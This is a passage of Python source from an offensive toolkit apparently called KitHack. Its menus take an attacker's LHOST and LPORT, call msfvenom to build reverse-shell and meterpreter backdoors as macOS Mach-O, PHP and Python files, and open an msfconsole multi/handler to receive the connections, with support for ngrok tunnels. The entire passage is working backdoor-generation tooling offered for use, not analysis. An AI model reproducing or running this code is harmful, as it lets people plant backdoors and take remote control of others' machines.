					os.system('systemctl stop postgresql && clear')
					main()						

			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p osx/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()			

			elif pay == '03':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()											

			elif pay == '04':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '05':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p osx/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/shell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '06':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p osx/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x86/shell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	
			else:
				print("\n{}[X] INVALID OPTION\n".format(RED))
				time.sleep(3)
				pause("{}Press any key to continue...".format(GREEN))
				os.system('clear')
				main()	

		elif sys == '05':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} php/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[02]{1} php/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[03]{1} php/reverse_php'.format(WHITE, YELLOW))

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
			pay = tool.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p php/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.php'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.php".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD php/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()				
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			if pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.php'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.php".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD php/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()				
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()											

			elif pay == '03':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p php/reverse_php LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.php'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.php".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/reverse_php; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD php/reverse_php; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			else:
				print("\n{}[X] INVALID OPTION\n".format(RED))
				time.sleep(3)
				pause("{}Press any key to continue...".format(GREEN))
				os.system('clear')
				main()	

		elif sys == '06':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} python/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} python/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} python/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} python/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} python/shell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[06]{1} python/shell_reverse_tcp_ssl'.format(WHITE, YELLOW))
			print ('{0}[07]{1} python/shell_reverse_udp'.format(WHITE, YELLOW))

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/meterpreter_reverse_http LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()								

			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/meterpreter_reverse_https LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			elif pay == '03':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()								
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			elif pay == '04':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()								
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '05':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/shell_reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/shell_reverse_tcp; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()				
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '06':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/shell_reverse_tcp_ssl LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_tcp_ssl; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/shell_reverse_tcp_ssl; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			elif pay == '07':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/shell_reverse_udp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_udp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
